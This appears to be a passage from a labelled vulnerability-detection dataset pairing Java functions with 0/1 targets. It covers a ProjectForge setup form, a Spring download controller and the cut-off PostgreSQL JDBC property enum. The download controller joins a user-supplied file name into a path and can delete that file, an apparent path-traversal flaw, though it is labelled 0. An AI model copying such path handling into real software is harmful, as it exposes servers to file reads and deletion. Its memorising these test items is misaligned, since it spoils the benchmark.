org.projectforge.web.wicket.components.RequiredMaxLengthTextField;\nimport org.projectforge.web.wicket.components.SingleButtonPanel;\nimport org.projectforge.web.wicket.components.TimeZonePanel;\nimport org.projectforge.web.wicket.flowlayout.DivPanel;\nimport org.projectforge.web.wicket.flowlayout.DivType;\nimport org.projectforge.web.wicket.flowlayout.FieldsetPanel;\nimport org.projectforge.web.wicket.flowlayout.InputPanel;\nimport org.projectforge.web.wicket.flowlayout.ParTextPanel;\nimport org.projectforge.web.wicket.flowlayout.PasswordPanel;\nimport org.projectforge.web.wicket.flowlayout.RadioGroupPanel;\n\npublic class SetupForm extends AbstractForm<SetupForm, SetupPage>\n{\n  private static final long serialVersionUID = -277853572580468505L;\n\n  private static final String MAGIC_PASSWORD = \"******\";\n\n  @SpringBean(name = \"userDao\")\n  private UserDao userDao;\n\n  private final SetupTarget setupMode = SetupTarget.TEST_DATA;\n\n  private final TimeZone timeZone = TimeZone.getDefault();\n\n  private String sysopEMail;\n\n  private String feedbackEMail;\n\n  private String calendarDomain;\n\n  private final String adminUsername = InitDatabaseDao.DEFAULT_ADMIN_USER;\n\n  // @SuppressWarnings(\"unused\")\n  // private String organization;\n\n  @SuppressWarnings(\"unused\")\n  private String password;\n\n  @SuppressWarnings(\"unused\")\n  private String passwordRepeat;\n\n  private String encryptedPassword;\n\n  public SetupForm(final SetupPage parentPage)\n  {\n    super(parentPage, \"setupform\");\n  }\n\n  @Override\n  @SuppressWarnings(\"serial\")\n  protected void init()\n  {\n    add(createFeedbackPanel());\n    final GridBuilder gridBuilder = newGridBuilder(this, \"flowform\");\n    gridBuilder.newFormHeading(getString(\"administration.setup.heading\"));\n    final DivPanel panel = gridBuilder.getPanel();\n    panel.add(new ParTextPanel(panel.newChildId(), getString(\"administration.setup.heading.subtitle\")));\n    {\n      // RadioChoice mode\n      final FieldsetPanel fs = gridBuilder.newFieldset(getString(\"administration.setup.target\"));\n      final DivPanel radioPanel = new DivPanel(fs.newChildId(), DivType.RADIOBOX);\n      fs.add(radioPanel);\n      fs.setLabelFor(radioPanel);\n      final RadioGroupPanel<SetupTarget> radioGroup = new RadioGroupPanel<SetupTarget>(radioPanel.newChildId(), \"setuptarget\",\n          new PropertyModel<SetupTarget>(this, \"setupMode\"));\n      radioPanel.add(radioGroup);\n      for (final SetupTarget target : SetupTarget.values()) {\n        radioGroup.add(new Model<SetupTarget>(target), getString(target.getI18nKey()), getString(target.getI18nKey() + \".tooltip\"));\n      }\n    }\n    // final RequiredMaxLengthTextField organizationField = new RequiredMaxLengthTextField(this, \"organization\", getString(\"organization\"),\n    // new PropertyModel<String>(this, \"organization\"), 100);\n    // add(organizationField);\n    {\n      // User name\n      final FieldsetPanel fs = gridBuilder.newFieldset(getString(\"username\"));\n      fs.add(new RequiredMaxLengthTextField(InputPanel.WICKET_ID, new PropertyModel<String>(this, \"adminUsername\"), 100));\n    }\n    final PasswordTextField passwordField = new PasswordTextField(PasswordPanel.WICKET_ID, new PropertyModel<String>(this, \"password\")) {\n      @Override\n      protected void onComponentTag(final ComponentTag tag)\n      {\n        super.onComponentTag(tag);\n        if (encryptedPassword == null) {\n          tag.put(\"value\", \"\");\n        } else if (StringUtils.isEmpty(getConvertedInput()) == false) {\n          tag.put(\"value\", MAGIC_PASSWORD);\n        }\n      }\n    };\n    {\n      // Password\n      final FieldsetPanel fs = gridBuilder.newFieldset(getString(\"password\"));\n      passwordField.setRequired(true); // No setReset(true), otherwise uploading and re-entering passwords is a real pain.\n      fs.add(passwordField);\n      WicketUtils.setFocus(passwordField);\n    }\n    {\n      // Password repeat\n      final FieldsetPanel fs = gridBuilder.newFieldset(getString(\"passwordRepeat\"));\n      final PasswordTextField passwordRepeatField = new PasswordTextField(PasswordPanel.WICKET_ID, new PropertyModel<String>(this,\n          \"passwordRepeat\")) {\n        @Override\n        protected void onComponentTag(final ComponentTag tag)\n        {\n          super.onComponentTag(tag);\n          if (encryptedPassword == null) {\n            tag.put(\"value\", \"\");\n          } else if (StringUtils.isEmpty(getConvertedInput()) == false) {\n            tag.put(\"value\", MAGIC_PASSWORD);\n          }\n        }\n      };\n      passwordRepeatField.setRequired(true); // No setReset(true), otherwise uploading and re-entering passwords is a real pain.\n      passwordRepeatField.add(new IValidator<String>() {\n        @Override\n        public void validate(final IValidatable<String> validatable)\n        {\n          final String input = validatable.getValue();\n          final String passwordInput = passwordField.getConvertedInput();\n          if (StringUtils.equals(input, passwordInput) == false) {\n            passwordRepeatField.error(getString(\"user.error.passwordAndRepeatDoesNotMatch\"));\n            encryptedPassword = null;\n            return;\n          }\n          if (MAGIC_PASSWORD.equals(passwordInput) == false || encryptedPassword == null) {\n            final String errorMsgKey = userDao.checkPasswordQuality(passwordInput);\n            if (errorMsgKey != null) {\n              encryptedPassword = null;\n              passwordField.error(getString(errorMsgKey));\n            } else {\n              encryptedPassword = userDao.encryptPassword(passwordInput);\n            }\n          }\n        }\n      });\n      fs.add(passwordRepeatField);\n    }\n    {\n      // Time zone\n      final FieldsetPanel fs = gridBuilder.newFieldset(getString(\"administration.configuration.param.timezone\"));\n      final TimeZonePanel timeZone = new TimeZonePanel(fs.newChildId(), new PropertyModel<TimeZone>(this, \"timeZone\"));\n      fs.setLabelFor(timeZone);\n      fs.add(timeZone);\n      fs.addHelpIcon(getString(\"administration.configuration.param.timezone.description\"));\n    }\n    {\n      // Calendar domain\n      final FieldsetPanel fs = gridBuilder.newFieldset(getString(\"administration.configuration.param.calendarDomain\"));\n      final RequiredMaxLengthTextField textField = new RequiredMaxLengthTextField(InputPanel.WICKET_ID, new PropertyModel<String>(this,\n          \"calendarDomain\"), ConfigurationDO.PARAM_LENGTH);\n      fs.add(textField);\n      textField.add(new IValidator<String>() {\n        @Override\n        public void validate(final IValidatable<String> validatable)\n        {\n          if (Configuration.isDomainValid(validatable.getValue()) == false) {\n            textField.error(getString(\"validation.error.generic\"));\n          }\n        }\n      });\n      fs.addHelpIcon(getString(\"administration.configuration.param.calendarDomain.description\"));\n    }\n    {\n      // E-Mail sysops\n      final FieldsetPanel fs = gridBuilder.newFieldset(getString(\"administration.configuration.param.systemAdministratorEMail.label\"),\n          getString(\"email\"));\n      fs.add(new MaxLengthTextField(InputPanel.WICKET_ID, new PropertyModel<String>(this, \"sysopEMail\"), ConfigurationDO.PARAM_LENGTH));\n      fs.addHelpIcon(getString(\"administration.configuration.param.systemAdministratorEMail.description\"));\n    }\n    {\n      // E-Mail sysops\n      final FieldsetPanel fs = gridBuilder.newFieldset(getString(\"administration.configuration.param.feedbackEMail.label\"),\n          getString(\"email\"));\n      fs.add(new MaxLengthTextField(InputPanel.WICKET_ID, new PropertyModel<String>(this, \"feedbackEMail\"), ConfigurationDO.PARAM_LENGTH));\n      fs.addHelpIcon(getString(\"administration.configuration.param.feedbackEMail.description\"));\n    }\n    final RepeatingView actionButtons = new RepeatingView(\"buttons\");\n    add(actionButtons);\n    {\n      final Button finishButton = new Button(SingleButtonPanel.WICKET_ID, new Model<String>(\"finish\")) {\n        @Override\n        public final void onSubmit()\n        {\n          parentPage.finishSetup();\n        }\n      };\n      final SingleButtonPanel finishButtonPanel = new SingleButtonPanel(actionButtons.newChildId(), finishButton,\n          getString(\"administration.setup.finish\"), SingleButtonPanel.DEFAULT_SUBMIT);\n      actionButtons.add(finishButtonPanel);\n      setDefaultButton(finishButton);\n    }\n  }\n\n  public SetupTarget getSetupMode()\n  {\n    return setupMode;\n  }\n\n  public TimeZone getTimeZone()\n  {\n    return timeZone;\n  }\n\n  /**\n   * @return the calendarDomain\n   */\n  public String getCalendarDomain()\n  {\n    return calendarDomain;\n  }\n\n  public String getSysopEMail()\n  {\n    return sysopEMail;\n  }\n\n  public String getFeedbackEMail()\n  {\n    return feedbackEMail;\n  }\n\n  public String getEncryptedPassword()\n  {\n    return encryptedPassword;\n  }\n\n  public String getAdminUsername()\n  {\n    return adminUsername;\n  }\n}\n", "target": 1}
{"idx": 1031, "func": "package cc.mrbird.common.controller;\n\nimport cc.mrbird.common.exception.FileDownloadException;\nimport org.apache.commons.lang3.StringUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.*;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\n@Controller\npublic class CommonController {\n\n    private Logger log = LoggerFactory.getLogger(this.getClass());\n\n    @RequestMapping(\"common/download\")\n    public void fileDownload(String fileName, Boolean delete, HttpServletResponse response) throws IOException, FileDownloadException {\n        if (StringUtils.isNotBlank(fileName) && !fileName.endsWith(\".xlsx\"))\n            throw new FileDownloadException(\"不支持该类型文件下载\");\n        String realFileName = System.currentTimeMillis() + fileName.substring(fileName.indexOf('_') + 1);\n        String filePath = \"file/\" + fileName;\n        File file = new File(filePath);\n        if (!file.exists())\n            throw new FileDownloadException(\"文件未找到\");\n        response.setHeader(\"Content-Disposition\", \"attachment;fileName=\" + java.net.URLEncoder.encode(realFileName, \"utf-8\"));\n        response.setContentType(\"multipart/form-data\");\n        response.setCharacterEncoding(\"utf-8\");\n        try (InputStream inputStream = new FileInputStream(file); OutputStream os = response.getOutputStream()) {\n            byte[] b = new byte[2048];\n            int length;\n            while ((length = inputStream.read(b)) > 0) {\n                os.write(b, 0, length);\n            }\n        } catch (Exception e) {\n            log.error(\"文件下载失败\", e);\n        } finally {\n            if (delete)\n                Files.delete(Paths.get(filePath));\n        }\n    }\n}\n", "target": 0}
{"idx": 1032, "func": "/*\n * Copyright (c) 2004, PostgreSQL Global Development Group\n * See the LICENSE file in the project root for more information.\n */\n\npackage org.postgresql;\n\nimport org.postgresql.util.DriverInfo;\nimport org.postgresql.util.GT;\nimport org.postgresql.util.PSQLException;\nimport org.postgresql.util.PSQLState;\n\nimport java.sql.Connection;\nimport java.sql.DriverPropertyInfo;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\n\n/**\n * All connection parameters that can be either set in JDBC URL, in Driver properties or in\n * datasource setters.\n */\npublic enum PGProperty {\n\n  /**\n   * When using the V3 protocol the driver monitors changes in certain server configuration\n   * parameters that should not be touched by end users. The {@code client_encoding} setting is set\n   * by the driver and should not be altered. If the driver detects a change it will abort the\n   * connection.\n   */\n  ALLOW_ENCODING_CHANGES(\n    \"allowEncodingChanges\",\n    \"false\",\n    \"Allow for changes in client_encoding\"),\n\n  /**\n   * The application name (require server version &gt;= 9.0).\n   */\n  APPLICATION_NAME(\n    \"ApplicationName\",\n    DriverInfo.DRIVER_NAME,\n    \"Name of the Application (backend >= 9.0)\"),\n\n  /**\n   * Assume the server is at least that version.\n   */\n  ASSUME_MIN_SERVER_VERSION(\n    \"assumeMinServerVersion\",\n    null,\n    \"Assume the server is at least that version\"),\n\n  /**\n   * Specifies what the driver should do if a query fails. In {@code autosave=always} mode, JDBC driver sets a savepoint before each query,\n   * and rolls back to that savepoint in case of failure. In {@code autosave=never} mode (default), no savepoint dance is made ever.\n   * In {@code autosave=conservative} mode, savepoint is set for each query, however the rollback is done only for rare cases\n   * like 'cached statement cannot change return type' or 'statement XXX is not valid' so JDBC driver rollsback and retries\n   */\n  AUTOSAVE(\n    \"autosave\",\n    \"never\",\n    \"Specifies what the driver should do if a query fails. In autosave=always mode, JDBC driver sets a savepoint before each query, \"\n        + \"and rolls back to that savepoint in case of failure. In autosave=never mode (default), no savepoint dance is made ever. \"\n        + \"In autosave=conservative mode, safepoint is set for each query, however the rollback is done only for rare cases\"\n        + \" like 'cached statement cannot change return type' or 'statement XXX is not valid' so JDBC driver rollsback and retries\",\n    false,\n    new String[] {\"always\", \"never\", \"conservative\"}),\n\n  /**\n   * Use binary format for sending and receiving data if possible.\n   */\n  BINARY_TRANSFER(\n    \"binaryTransfer\",\n    \"true\",\n    \"Use binary format for sending and receiving data if possible\"),\n\n  /**\n   * Comma separated list of types to disable binary transfer. Either OID numbers or names.\n   * Overrides values in the driver default set and values set with binaryTransferEnable.\n   */\n  BINARY_TRANSFER_DISABLE(\n    \"binaryTransferDisable\",\n    \"\",\n    \"Comma separated list of types to disable binary transfer. Either OID numbers or names. Overrides values in the driver default set and values set with binaryTransferEnable.\"),\n\n  /**\n   * Comma separated list of types to enable binary transfer. Either OID numbers or names\n   */\n  BINARY_TRANSFER_ENABLE(\n    \"binaryTransferEnable\",\n    \"\",\n    \"Comma separated list of types to enable binary transfer. Either OID numbers or names\"),\n\n  /**\n   * Cancel command is sent out of band over its own connection, so cancel message can itself get\n   * stuck.\n   * This property controls \"connect timeout\" and \"socket timeout\" used for cancel commands.\n   * The timeout is specified in seconds. Default value is 10 seconds.\n   */\n  CANCEL_SIGNAL_TIMEOUT(\n    \"cancelSignalTimeout\",\n    \"10\",\n    \"The timeout that is used for sending cancel command.\"),\n\n  /**\n   * Determine whether SAVEPOINTS used in AUTOSAVE will be released per query or not\n   */\n  CLEANUP_SAVEPOINTS(\n    \"cleanupSavepoints\",\n    \"false\",\n    \"Determine whether SAVEPOINTS used in AUTOSAVE will be released per query or not\",\n    false,\n    new String[] {\"true\", \"false\"}),\n\n  /**\n   * <p>The timeout value used for socket connect operations. If connecting to the server takes longer\n   * than this value, the connection is broken.</p>\n   *\n   * <p>The timeout is specified in seconds and a value of zero means that it is disabled.</p>\n   */\n  CONNECT_TIMEOUT(\n    \"connectTimeout\",\n    \"10\",\n    \"The timeout value used for socket connect operations.\"),\n\n  /**\n   * Specify the schema (or several schema separated by commas) to be set in the search-path. This schema will be used to resolve\n   * unqualified object names used in statements over this connection.\n   */\n  CURRENT_SCHEMA(\n    \"currentSchema\",\n    null,\n    \"Specify the schema (or several schema separated by commas) to be set in the search-path\"),\n\n  /**\n   * Specifies the maximum number of fields to be cached per connection. A value of {@code 0} disables the cache.\n   */\n  DATABASE_METADATA_CACHE_FIELDS(\n    \"databaseMetadataCacheFields\",\n    \"65536\",\n    \"Specifies the maximum number of fields to be cached per connection. A value of {@code 0} disables the cache.\"),\n\n  /**\n   * Specifies the maximum size (in megabytes) of fields to be cached per connection. A value of {@code 0} disables the cache.\n   */\n  DATABASE_METADATA_CACHE_FIELDS_MIB(\n    \"databaseMetadataCacheFieldsMiB\",\n    \"5\",\n    \"Specifies the maximum size (in megabytes) of fields to be cached per connection. A value of {@code 0} disables the cache.\"),\n\n  /**\n   * Default parameter for {@link java.sql.Statement#getFetchSize()}. A value of {@code 0} means\n   * that need fetch all rows at once\n   */\n  DEFAULT_ROW_FETCH_SIZE(\n    \"defaultRowFetchSize\",\n    \"0\",\n    \"Positive number of rows that should be fetched from the database when more rows are needed for ResultSet by each fetch iteration\"),\n\n  /**\n   * Enable optimization that disables column name sanitiser.\n   */\n  DISABLE_COLUMN_SANITISER(\n    \"disableColumnSanitiser\",\n    \"false\",\n    \"Enable optimization that disables column name sanitiser\"),\n\n  /**\n   * Specifies how the driver transforms JDBC escape call syntax into underlying SQL, for invoking procedures or functions. (backend &gt;= 11)\n   * In {@code escapeSyntaxCallMode=select} mode (the default), the driver always uses a SELECT statement (allowing function invocation only).\n   * In {@code escapeSyntaxCallMode=callIfNoReturn} mode, the driver uses a CALL statement (allowing procedure invocation) if there is no return parameter specified, otherwise the driver uses a SELECT statement.\n   * In {@code escapeSyntaxCallMode=call} mode, the driver always uses a CALL statement (allowing procedure invocation only).\n   */\n  ESCAPE_SYNTAX_CALL_MODE(\n    \"escapeSyntaxCallMode\",\n    \"select\",\n    \"Specifies how the driver transforms JDBC escape call syntax into underlying SQL, for invoking procedures or functions. (backend >= 11)\"\n      + \"In escapeSyntaxCallMode=select mode (the default), the driver always uses a SELECT statement (allowing function invocation only).\"\n      + \"In escapeSyntaxCallMode=callIfNoReturn mode, the driver uses a CALL statement (allowing procedure invocation) if there is no return parameter specified, otherwise the driver uses a SELECT statement.\"\n      + \"In escapeSyntaxCallMode=call mode, the driver always uses a CALL statement (allowing procedure invocation only).\",\n    false,\n    new String[] {\"select\", \"callIfNoReturn\", \"call\"}),\n\n  /**\n   * Force one of\n   * <ul>\n   * <li>SSPI (Windows transparent single-sign-on)</li>\n   * <li>GSSAPI (Kerberos, via JSSE)</li>\n   * </ul>\n   * to be used when the server requests Kerberos or SSPI authentication.\n   */\n  GSS_LIB(\n    \"gsslib\",\n    \"auto\",\n    \"Force SSSPI or GSSAPI\",\n    false,\n    new String[] {\"auto\", \"sspi\", \"gssapi\"}),\n\n  /**\n   * Enable mode to filter out the names of database objects for which the current user has no privileges\n   * granted from appearing in the DatabaseMetaData returned by the driver.\n   */\n  HIDE_UNPRIVILEGED_OBJECTS(\n    \"hideUnprivilegedObjects\",\n    \"false\",\n    \"Enable hiding of database objects for which the current user has no privileges granted from the DatabaseMetaData\"),\n\n  HOST_RECHECK_SECONDS(\n    \"hostRecheckSeconds\",\n    \"10\",\n    \"Specifies period (seconds) after which the host status is checked again in case it has changed\"),\n\n  /**\n   * Specifies the name of the JAAS system or application login configuration.\n   */\n  JAAS_APPLICATION_NAME(\n    \"jaasApplicationName\",\n    null,\n    \"Specifies the name of the JAAS system or application login configuration.\"),\n\n  /**\n   * Flag to enable/disable obtaining a GSS credential via JAAS login before authenticating.\n   * Useful if setting system property javax.security.auth.useSubjectCredsOnly=false\n   * or using native GSS with system property sun.security.jgss.native=true\n   */\n  JAAS_LOGIN(\n    \"jaasLogin\",\n    \"true\",\n    \"Login with JAAS before doing GSSAPI authentication\"),\n\n  /**\n   * The Kerberos service name to use when authenticating with GSSAPI. This is equivalent to libpq's\n   * PGKRBSRVNAME environment variable.\n   */\n  KERBEROS_SERVER_NAME(\n    \"kerberosServerName\",\n    null,\n    \"The Kerberos service name to use when authenticating with GSSAPI.\"),\n\n  LOAD_BALANCE_HOSTS(\n    \"loadBalanceHosts\",\n    \"false\",\n    \"If disabled hosts are connected in the given order. If enabled hosts are chosen randomly from the set of suitable candidates\"),\n\n  /**\n   * <p>File name output of the Logger, if set, the Logger will use a\n   * {@link java.util.logging.FileHandler} to write to a specified file. If the parameter is not set\n   * or the file can't be created the {@link java.util.logging.ConsoleHandler} will be used instead.</p>\n   *\n   * <p>Parameter should be use together with {@link PGProperty#LOGGER_LEVEL}</p>\n   */\n  LOGGER_FILE(\n    \"loggerFile\",\n    null,\n    \"File name output of the Logger\"),\n\n  /**\n   * <p>Logger level of the driver. Allowed values: {@code OFF}, {@code DEBUG} or {@code TRACE}.</p>\n   *\n   * <p>This enable the {@link java.util.logging.Logger} of the driver based on the following mapping\n   * of levels:</p>\n   * <ul>\n   *     <li>FINE -&gt; DEBUG</li>\n   *     <li>FINEST -&gt; TRACE</li>\n   * </ul>\n   *\n   * <p><b>NOTE:</b> The recommended approach to enable java.util.logging is using a\n   * {@code logging.properties} configuration file with the property\n   * {@code -Djava.util.logging.config.file=myfile} or if your are using an application server\n   * you should use the appropriate logging subsystem.</p>\n   */\n  LOGGER_LEVEL(\n    \"loggerLevel\",\n    null,\n    \"Logger level of the driver\",\n    false,\n    new String[] {\"OFF\", \"DEBUG\", \"TRACE\"}),\n\n  /**\n   * Specify how long to wait for establishment of a database connection. The timeout is specified\n   * in seconds.\n   */\n  LOGIN_TIMEOUT(\n    \"loginTimeout\",\n    \"0\",\n    \"Specify how long to wait for establishment of a database connection.\"),\n\n  /**\n   * Whether to include full server error detail in exception messages.\n   */\n  LOG_SERVER_ERROR_DETAIL(\n    \"logServerErrorDetail\",\n    \"true\",\n    \"Include full server error detail in exception messages. If disabled then only the error itself will be included.\"),\n\n  /**\n   * When connections that are not explicitly closed are garbage collected, log the stacktrace from\n   * the opening of the connection to trace the leak source.\n   */\n  LOG_UNCLOSED_CONNECTIONS(\n    \"logUnclosedConnections\",\n    \"false\",\n    \"When connections that are not explicitly closed are garbage collected, log the stacktrace from the opening of the connection to trace the leak source\"),\n\n  /**\n   * Specifies size of buffer during fetching result set. Can be specified as specified size or\n   * percent of heap memory.\n   */\n  MAX_RESULT_BUFFER(\n    \"maxResultBuffer\",\n    null,\n    \"Specifies size of buffer during fetching result set. Can be specified as specified size or percent of heap memory.\"),\n\n  /**\n   * Specify 'options' connection initialization parameter.\n   * The value of this parameter may contain spaces and other special characters or their URL representation.\n   */\n  OPTIONS(\n    \"options\",\n    null,\n    \"Specify 'options' connection initialization parameter.\"),\n\n  /**\n   * Password to use when authenticating.\n   */\n  PASSWORD(\n    \"password\",\n    null,\n    \"Password to use when authenticating.\",\n    false),\n\n  /**\n   * Database name to connect to (may be specified directly in the JDBC URL).\n   */\n  PG_DBNAME(\n    \"PGDBNAME\",\n    null,\n    \"Database name to connect to (may be specified directly in the JDBC URL)\",\n    true),\n\n  /**\n   * Hostname of the PostgreSQL server (may be specified directly in the JDBC URL).\n   */\n  PG_HOST(\n    \"PGHOST\",\n    null,\n    \"Hostname of the PostgreSQL server (may be specified directly in the JDBC URL)\",\n    false),\n\n  /**\n   * Port of the PostgreSQL server (may be specified directly in the JDBC URL).\n   */\n  PG_PORT(\n    \"PGPORT\",\n    null,\n    \"Port of the PostgreSQL server (may be specified directly in the JDBC URL)\"),\n\n  /**\n   * <p>Specifies which mode is used to execute queries to database: simple means ('Q' execute, no parse, no bind, text mode only),\n   * extended means always use bind/execute messages, extendedForPrepared means extended for prepared statements only,\n   * extendedCacheEverything means use extended protocol and try cache every statement (including Statement.execute(String sql)) in a query cache.</p>\n   *\n   * <p>This mode is meant for debugging purposes and/or for cases when extended protocol cannot be used (e.g. logical replication protocol)</p>\n   */\n  PREFER_QUERY_MODE(\n    \"preferQueryMode\",\n    \"extended\",\n    \"Specifies which mode is used to execute queries to database: simple means ('Q' execute, no parse, no bind, text mode only), \"\n        + \"extended means always use bind/execute messages, extendedForPrepared means extended for prepared statements only, \"\n        + \"extendedCacheEverything means use extended protocol and try cache every statement (including Statement.execute(String sql)) in a query cache.\", false,\n    new String[] {\"extended\", \"extendedForPrepared\", \"extendedCacheEverything\", \"simple\"}),\n\n  /**\n   * Specifies the maximum number of entries in cache of prepared statements. A value of {@code 0}\n   * disables the cache.\n   */\n  PREPARED_STATEMENT_CACHE_QUERIES(\n    \"preparedStatementCacheQueries\",\n    \"256\",\n    \"Specifies the maximum number of entries in per-connection cache of prepared statements. A value of {@code 0} disables the cache.\"),\n\n  /**\n   * Specifies the maximum size (in megabytes) of the prepared statement cache. A value of {@code 0}\n   * disables the cache.\n   */\n  PREPARED_STATEMENT_CACHE_SIZE_MIB(\n    \"preparedStatementCacheSizeMiB\",\n    \"5\",\n    \"Specifies the maximum size (in megabytes) of a per-connection prepared statement cache. A value of {@code 0} disables the cache.\"),\n\n  /**\n   * Sets the default threshold for enabling server-side prepare. A value of {@code -1} stands for\n   * forceBinary\n   */\n  PREPARE_THRESHOLD(\n    \"prepareThreshold\",\n    \"5\",\n    \"Statement prepare threshold. A value of {@code -1} stands for forceBinary\"),\n\n  /**\n   * Force use of a particular protocol version when connecting, if set, disables protocol version\n   * fallback.\n   */\n  PROTOCOL_VERSION(\n    \"protocolVersion\",\n    null,\n    \"Force use of a particular protocol version when connecting, currently only version 3 is supported.\",\n    false,\n    new String[] {\"3\"}),\n\n  /**\n   * Puts this connection in read-only mode.\n   */\n  READ_ONLY(\n    \"readOnly\",\n    \"false\",\n    \"Puts this connection in read-only mode\"),\n\n  /**\n   * Connection parameter to control behavior when\n   * {@link Connection#setReadOnly(boolean)} is set to {@code true}.\n   */\n  READ_ONLY_MODE(\n    \"readOnlyMode\",\n    \"transaction\",\n    \"Controls the behavior when a connection is set to be read only, one of 'ignore', 'transaction', or 'always' \"\n      + \"When 'ignore', setting readOnly has no effect. \"\n      + \"When 'transaction' setting readOnly to 'true' will cause transactions to BEGIN READ ONLY if autocommit is 'false'. \"\n      + \"When 'always' setting readOnly to 'true' will set the session to READ ONLY if autoCommit is 'true' \"\n      + \"and the transaction to BEGIN READ ONLY if autocommit is 'false'.\",\n    false,\n    new String[] {\"ignore\", \"transaction\", \"always\"}),\n\n  /**\n   * Socket read buffer size (SO_RECVBUF). A value of {@code -1}, which is the default, means system\n   * default.\n   */\n  RECEIVE_BUFFER_SIZE(\n    \"receiveBufferSize\",\n    \"-1\",\n    \"Socket read buffer size\"),\n\n  /**\n   * <p>Connection parameter passed in the startup message. This parameter accepts two values; \"true\"\n   * and \"database\". Passing \"true\" tells the backend to go into walsender mode, wherein a small set\n   * of replication commands can be issued instead of SQL statements. Only the simple query protocol\n   * can be used in walsender mode. Passing \"database\" as the value instructs walsender to connect\n   * to the database specified in the dbname parameter, which will allow the connection to be used\n   * for logical replication from that database.</p>\n   * <p>Parameter should be use together with {@link PGProperty#ASSUME_MIN_SERVER_VERSION} with\n   * parameter &gt;= 9.4 (backend &gt;= 9.4)</p>\n   */\n  REPLICATION(\n    \"replication\",\n    null,\n    \"Connection parameter passed in startup message, one of 'true' or 'database' \"\n      + \"Passing 'true' tells the backend to go into walsender mode, \"\n      + \"wherein a small set of replication commands can be issued instead of SQL statements. \"\n      + \"Only the simple query protocol can be used in walsender mode. \"\n      + \"Passing 'database' as the value instructs walsender to connect \"\n      + \"to the database specified in the dbname parameter, \"\n      + \"which will allow the connection to be used for logical replication \"\n      + \"from that database. \"\n      + \"(backend >= 9.4)\"),\n\n  /**\n   * Configure optimization to enable batch insert re-writing.\n   */\n  REWRITE_BATCHED_INSERTS(\n    \"reWriteBatchedInserts\",\n    \"false\",\n    \"Enable optimization to rewrite and collapse compatible INSERT statements that are batched.\"),\n\n  /**\n   * Socket write buffer size (SO_SNDBUF). A value of {@code -1}, which is the default, means system\n   * default.\n   */\n  SEND_BUFFER_SIZE(\n    \"sendBufferSize\",\n    \"-1\",\n    \"Socket write buffer size\"),\n\n  /**\n   * Socket factory used to create socket. A null value, which is the default, means system default.\n   */\n  SOCKET_FACTORY(\n    \"socketFactory\",\n    null,\n    \"Specify a socket factory for socket creation\"),\n\n  /**\n   * The String argument to give to the constructor of the Socket Factory.\n   * @deprecated use {@code ..Factory(Properties)} constructor.\n   */\n  @Deprecated\n  SOCKET_FACTORY_ARG(\n    \"socketFactoryArg\",\n    null,\n    \"Argument forwarded to constructor of SocketFactory class.\"),\n\n  /**\n   * The timeout value used for socket read operations. If reading from the server takes longer than\n   * this value, the connection is closed. This can be used as both a brute force global query\n   * timeout and a method of detecting network problems. The timeout is specified in seconds and a\n   * value of zero means that it is disabled.\n   */\n  SOCKET_TIMEOUT(\n    \"socketTimeout\",\n    \"0\",\n    \"The timeout value used for socket read operations.\"),\n\n  /**\n   * Control use of SSL: empty or {@code true} values imply {@code sslmode==verify-full}\n   */\n  SSL(\n    \"ssl\",\n    null,\n    \"Control use of SSL (any non-null value causes SSL to be required)\"),\n\n  /**\n   * File containing the SSL Certificate. Default will be the file {@code postgresql.crt} in {@code\n   * $HOME/.postgresql} (*nix) or {@code %APPDATA%\\postgresql} (windows).\n   */\n  SSL_CERT(\n    \"sslcert\",\n    null,\n    \"The location of the client's SSL certificate\"),\n\n  /**\n   * Classname of the SSL Factory to use (instance of {@code javax.net.ssl.SSLSocketFactory}).\n   */\n  SSL_FACTORY(\n    \"sslfactory\",\n    null,\n    \"Provide a SSLSocketFactory class when using SSL.\"),\n\n  /**\n   * The String argument to give to the constructor of the SSL Factory.\n   * @deprecated use {@code ..Factory(Properties)} constructor.\n   */\n  @Deprecated\n  SSL_FACTORY_ARG(\n    \"sslfactoryarg\",\n    null,\n    \"Argument forwarded to constructor of SSLSocketFactory class.\"),\n\n  /**\n   * Classname of the SSL HostnameVerifier to use (instance of {@code\n   * javax.net.ssl.HostnameVerifier}).\n   */\n  SSL_HOSTNAME_VERIFIER(\n    \"sslhostnameverifier\",\n    null,\n    \"A class, implementing javax.net.ssl.HostnameVerifier that can verify the server\"),\n\n  /**\n   * File containing the SSL Key. Default will be the file {@code postgresql.pk8} in {@code\n   * $HOME/.postgresql} (*nix) or {@code %APPDATA%\\postgresql} (windows).\n   */\n  SSL_KEY(\n    \"sslkey\",\n    null,\n    \"The location of the client's PKCS#8 SSL key\"),\n\n  /**\n   * Parameter governing the use of SSL. The allowed values are {@code disable}, {@code allow},\n   * {@code prefer}, {@code require}, {@code verify-ca}, {@code verify-full}.\n   * If {@code ssl} property is empty or set to {@code true} it implies {@code verify-full}.\n   * Default mode is \"require\"\n   */\n  SSL_MODE(\n    \"sslmode\",\n    null,\n    \"Parameter governing the use of SSL\",\n    false,\n    new String[] {\"disable\", \"allow\", \"prefer\", \"require\", \"verify-ca\", \"verify-full\"}),\n\n  /**\n   * The SSL password to use in the default CallbackHandler.\n   */\n  SSL_PASSWORD(\n    \"sslpassword\",\n    null,\n    \"The password for the client's ssl key (ignored if sslpasswordcallback is set)\"),\n\n\n  /**\n   * The classname instantiating {@code javax.security.auth.callback.CallbackHandler} to use.\n   */\n  SSL_PASSWORD_CALLBACK(\n    \"sslpasswordcallback\",\n    null,\n    \"A class, implementing javax.security.auth.callback.CallbackHandler that can handle PassworCallback for the ssl password.\"),\n\n  /**\n   * File containing the root certificate when validating server ({@code sslmode} = {@code\n   * verify-ca} or {@code verify-full}). Default will be the file {@code root.crt} in {@code\n   * $HOME/.postgresql} (*nix) or {@code %APPDATA%\\postgresql} (windows).\n   */\n  SSL_ROOT_CERT(\n    \"sslrootcert\",\n    null,\n    \"The location of the root certificate for authenticating the server.\"),\n\n  /**\n   * Specifies the name of the SSPI service class that forms the service class part of the SPN. The\n   * default, {@code POSTGRES}, is almost always correct.\n   */\n  SSPI_SERVICE_CLASS(\n    \"sspiServiceClass\",\n    \"POSTGRES\",\n    \"The Windows SSPI service class for SPN\"),\n\n  /**\n   * Bind String to either {@code unspecified} or {@code varchar}. Default is {@code varchar} for\n   * 8.0+ backends.\n   */\n  STRING_TYPE(\n    \"stringtype\",\n    null,\n    \"The type to 